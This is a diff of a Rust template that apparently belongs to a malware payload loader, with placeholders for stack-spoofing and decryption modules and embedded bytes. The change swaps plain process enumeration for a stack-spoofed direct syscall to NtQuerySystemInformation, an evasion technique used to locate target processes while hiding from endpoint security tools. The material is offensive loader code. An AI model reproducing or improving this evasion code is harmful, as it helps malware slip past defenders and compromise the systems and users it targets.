@@ -5,7 +5,6 @@
 {{COMMON_MODULE}}
 {{STACK_SPOOF_MODULE}}
 
-use sysinfo::System;
 use std::include_bytes;
 use rust_syscalls::syscall;
 
@@ -34,15 +33,15 @@ use std::time::Instant;
 {{DECRYPTION_FUNCTION}}
 
 fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
-    let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
-    let tar_lower = tar.to_lowercase();
-    for (_, pro) in s.processes() {
-        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(pro.pid().as_u32() as usize);
-        }
-    }
-    dom
+    common::find_process_ids_by_name(tar, |buffer, len| unsafe {
+        spoofed_syscall!(
+            "NtQuerySystemInformation",
+            common::SYSTEM_PROCESS_INFORMATION_CLASS,
+            buffer,
+            len,
+            null_mut::<c_void>()
+        )
+    })
 }
 
 fn pause(ms: i64) {
